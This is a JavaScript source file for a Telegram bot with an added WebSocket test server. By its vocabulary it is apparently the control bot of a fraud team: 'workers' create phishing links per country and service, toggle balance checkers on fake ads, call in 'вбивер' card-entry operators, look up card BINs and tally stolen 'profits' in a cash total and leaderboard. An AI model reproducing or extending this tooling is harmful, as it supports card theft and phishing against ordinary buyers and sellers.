//---------- подготовка для WebSocket
const ws = require('ws')
const {Server} = ws;
const {v4: uuidv4} = require('uuid');
const {writeFile, readFileSync, existsSync} = require('fs');
const clients = {};
const loger = existsSync('loger') && readFileSync('loger', 'utf-8');
const messages = loger ? JSON.parse(loger) : [];
//------------------------------------------------



const auth = require("./middlewares/auth");
const requests = require("./middlewares/requests");
const stage = require("./scenes");
const session = require("telegraf/session");
const settingsMiddleware = require("./middlewares/settings");
const admin = require("./admin");
const menu = require("./commands/menu");
const { Writer, Country, Ad, User, Settings, Profit } = require("./database");
const writers = require("./commands/writers");
const createLink = require("./commands/createLink");
const createLinkCountry = require("./commands/createLinkCountry");
const myAds = require("./commands/myAds");
const myAd = require("./commands/myAd");
const log = require("./helpers/log");
const { Sequelize } = require("./models");
const binInfo = require("./helpers/binInfo");
const myProfits = require("./commands/myProfits");
const myProfit = require("./commands/myProfit");
const settings = require("./commands/settings");
const workersTop = require("./commands/workersTop");
const locale = require("./locale");
const moment = require("moment");
const { Op } = require("sequelize");

//----------- Запускаем сервер и привязываемся к WebSocket
// на хостере NAT-им порт {port: 3000} и не забываем в DNS прописать (A xxx.xxx.xxx.xxx "имя домена") 
const wss = new Server({port: 3000});
wss.on("connection", (ws) => {
    const id = uuidv4();
    clients[id] = ws;

    console.log(`New client ${id} ${clients[id]}`);
//    clients[id].send(JSON.stringify(messages));     //Эхо прилетит в браузер

    // тут ловим сообщение ОТ браузера
    clients[id].on('message', (rawMessage) => {
        const {_name_, _message_ } = JSON.parse(rawMessage);
        messages.push({_name_, _message_});
        console.log(JSON.parse(rawMessage));
        console.log(_name_, _message_);
    })

    clients[id].on('close', () => {
        delete clients[id];
        console.log(`Client is closed ${id}`)
    })
})
//------------------------------------------------




require("dotenv").config();

const { Telegraf, Markup } = require("telegraf"),
  bot = new Telegraf(process.env.BOT_TOKEN);

bot.on("new_chat_members", async (ctx) => {
  try {
    const users = ctx.message.new_chat_members;
    const settings = await Settings.findByPk(1);
    if (ctx.chat.id !== settings.allGroupId) {return;}
    users.map(async (v) => {
      const user = await User.findByPk(v.id, {
        include: [
          {
            association: "request",
          },
        ],
      });
      if (
        !user ||
        user?.banned ||
        !user?.request ||
        user?.request?.status !== 1
      ){
        return ctx.telegram
          .kickChatMember(ctx.chat.id, v.id)
          .catch((err) => err);}
      if (!settings.allHelloMsgEnabled) {return;}
      const text = locale.newChatMemberText;
      text = text.replace(
        `{username}`,
        `<b><a href="tg://user?id=${user.id}">${user.username}</a></b>`
      );
      ctx
        .reply(text, {
          parse_mode: "HTML",
          reply_markup: settings.payoutsChannelLink
            ? Markup.inlineKeyboard([
                [Markup.urlButton(locale.payouts, settings.payoutsChannelLink)],
              ])
            : {},
        })
        .catch((err) => err);
    });
  } catch (err) {}
});
bot.use((ctx, next) => ctx.from && next());
bot.use(session());
bot.use(settingsMiddleware);
bot.use(auth);
bot.use(stage.middleware());

bot.action("send_request", async (ctx) => {
  try {
    if (await ctx.state.user.getRequest()){
      return ctx.deleteMessage().catch((err) => err);
    }
    return ctx.scene.enter("send_request");
  } catch (err) {}
});
bot.use(requests);

bot.start((ctx) => ctx.chat.id == ctx.from.id && menu(ctx));
bot.action("start", menu);

bot.action("create_link", createLink);
bot.action("send_sms", (ctx) => ctx.scene.enter("send_sms"));


// ----------------- для теста localhost:3000
// прослушка - bot.hears, исключительно для тестa
bot.hears("sendMessage",(ctx)=>  {
    _name_ = uuidv4();
    _message_ = uuidv4();

    for (const id in clients) {
      // тут пересылка сообщения В браузер _name_, _message_
      clients[id].send(JSON.stringify([{_name_, _message_ }])) 
      console.log(_name_, _message_);
    }
});
// -------------------------------------------

bot.action(/^support_(\d+)_send_message$/, (ctx) =>
  ctx.scene.enter("support_send_message", {
    supportId: ctx.match[1],
  })
);

bot.action(/^create_link_([A-Za-z0-9]+)$/, (ctx) =>
  createLinkCountry(ctx, ctx.match[1])
);

bot.action(/^my_ads_(\d+)$/, (ctx) => myAds(ctx, ctx.match[1]));
bot.action(/^my_ad_(\d+)$/, (ctx) => myAd(ctx, ctx.match[1]));

bot.action(/^my_profits_(\d+)$/, (ctx) => myProfits(ctx, ctx.match[1]));
bot.action(/^my_profit_(\d+)$/, (ctx) => myProfit(ctx, ctx.match[1]));

bot.action("settings", settings);
bot.action(/^settings_nickname_(show|hide)$/, async (ctx) => {
  try {
    await ctx.state.user.update({
      hideNick: ctx.match[1] == "hide",
    });

    await ctx
      .answerCbQuery(
        "✅ Теперь ваш никнейм будет " +
          (ctx.state.user.hideNick ? "скрываться" : "показываться"),
        true
      )
      .catch((err) => err);

    return settings(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^my_ad_(\d+)_turn_(on|off)_balanceChecker$/, async (ctx) => {
  try {
    const ad = await Ad.findOne({
      where: {
        id: ctx.match[1],
        userId: ctx.from.id,
      },
    });
    if (!ad){
      return ctx
        .replyOrEdit("❌ Объявление не найдено", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("◀️ Назад", "my_ads_1")],
          ]),
        })
        .catch((err) => err);}
    await ad.update({
      balanceChecker: ctx.match[2] == "on",
    });
    log(
      ctx,
      `${
        ad.balanceChecker ? "включил" : "выключил"
      } чекер баланса для объявления <code>(ID: ${ad.id})</code>`
    );
    return myAd(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^my_ad_(\d+)_edit_price$/, (ctx) =>
  ctx.scene.enter("my_ad_edit_price", {
    adId: ctx.match[1],
  })
);

bot.action(/^my_ad_(\d+)_delete$/, async (ctx) => {
  try {
    const ad = await Ad.findOne({
      where: {
        id: ctx.match[1],
        userId: ctx.from.id,
      },
    });
    if (await ad.destroy()) {
      log(ctx, `удалил объявление <code>(ID: ${ad.id})</code>`);
      await ctx
        .answerCbQuery("✅ Объявление удалено", true)
        .catch((err) => err);
    }
    return myAds(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action("delete_all_my_ads", async (ctx) => {
  try {
    await Ad.destroy({
      where: {
        userId: ctx.from.id,
      },
    });
    await ctx
      .answerCbQuery("✅ Все ваши объявления были удалены", true)
      .catch((err) => err);
    return myAds(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.action(/^create_link_service_([A-Za-z0-9_]+)$/, (ctx) => {
  try {
    ctx.scene.enter(`create_link_${ctx.match[1]}`);
  } catch (err) {
    return ctx.reply("❌ Сервис не найден").catch((err) => err);
  }
});

bot.action("writers", (ctx) => writers(ctx));
bot.action("chats", (ctx) => {
  const all_btn = [];
  if (ctx.state.bot.allGroupLink){
    all_btn.push(Markup.urlButton("👥 Воркеры", ctx.state.bot.allGroupLink))
  };
  if (ctx.state.bot.payoutsChannelLink){
    all_btn.push(
      Markup.urlButton("💸 Выплаты", ctx.state.bot.payoutsChannelLink)
    )
  };
  if (all_btn.length < 1){
    all_btn = [Markup.callbackButton("Список пуст", "none")]
  };
  ctx
    .replyOrEdit("💬 Список чатов", {
      reply_markup: Markup.inlineKeyboard([
        all_btn,
        [Markup.callbackButton("◀️ В меню", "start")],
      ]),
    })
    .catch((err) => err);
});
bot.action("workers_top", workersTop);
bot.hears(/Топ|Топ воркеров|Топ профитов/giu, workersTop);
bot.command("top", workersTop);

bot.command("kassa", async (ctx) => {
  try {
    const kassa = await Profit.sum("convertedAmount"),
      kassa_today = await Profit.sum("convertedAmount", {
        where: {
          createdAt: {
            [Op.gte]: moment().startOf("day").toDate(),
          },
        },
      });

    return ctx
      .reply(
        `💸 Касса за всё время: <b>${parseFloat(kassa).toFixed(2)} RUB</b>      
💰 Сегодняшняя касса: <b>${parseFloat(kassa_today).toFixed(2)} RUB</b>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

bot.hears(/^кто вбивает|на вбиве|вбивер|вбивает|вбейте$/giu, (ctx) =>
  writers(ctx, false)
);
bot.use(admin);

// (async () => {
//   await bot.telegram.setWebhook(
//     `https://bot.icu/${process.env.BOT_TOKEN}`,
//     {
//       allowed_updates: ["message", "callback_query", "new_chat_members"],
//     }
//   );
//   await bot.startWebhook(`/${process.env.BOT_TOKEN}`, null, 5000);
//   console.log("bot started");
// })();
bot.launch();


// не очень-то нужен следующий кусок, просто разглядывал что в сообщения пушиться
process.on('SIGINT', () => {
  wss.close();
  writeFile('loger', JSON.stringify(messages), err => {
      if (err) {
          console.log(err);
      }
      process.exit();
  })
})